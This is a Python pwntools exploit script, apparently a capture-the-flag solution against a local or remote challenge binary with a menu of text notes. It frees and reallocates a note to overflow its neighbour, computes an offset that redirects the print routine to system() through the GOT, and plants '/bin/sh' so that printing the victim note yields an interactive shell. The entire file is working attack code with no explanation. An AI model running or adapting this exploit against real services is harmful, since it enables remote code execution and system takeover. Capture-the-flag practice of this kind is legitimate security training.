#!/usr/bin/env python3

import ctypes

from pwn import *

context.terminal = "kitty @launch --location=split --cwd=current".split()


def start(argv=[], *a, **kw):
    if args.LOCAL:
        argv = argv if argv else [exe.path]
        if args.GDB:
            return gdb.debug(argv, gdbscript=gdbscript, *a, **kw)
        return process(argv, *a, **kw)
    return remote(args.HOST or host, args.PORT or port, *a, **kw)


def safe_flat(*args, unsafe_chars=b"\n", **kwargs):
    p = flat(args, **kwargs)
    if any(c in unsafe_chars for c in p):
        raise ValueError("unsafe:", p)
    return p


def create_text(index, size, color, text):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"(1-16): ", str(index).encode())
    io.sendlineafter(b"Size: ", str(size).encode())
    io.sendlineafter(b"Color: ", str(color).encode())
    io.sendlineafter(b"Text: ", text)


def print_text(index):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"(1-16): ", str(index).encode())


def delete_text(index):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"(1-16): ", str(index).encode())


gdbscript = """
c
"""
host, port = args.HOST or "localhost", args.PORT or 16000
exe = context.binary = ELF(args.EXE or "../src/chall", False)

io = start()

create_text(1, 0x10, 1, b"overflow me")
create_text(2, 0x10, 1, b"victim")

delete_text(1)

system_offset = ctypes.c_uint((exe.got["system"] - exe.sym["printers"]) // 8).value
payload = p32(0) + p64(0) * 2 + p64(0x21) + p32(system_offset) + b"/bin/sh\0"
create_text(1, 0x10, 1, payload)

print_text(2)

io.interactive()
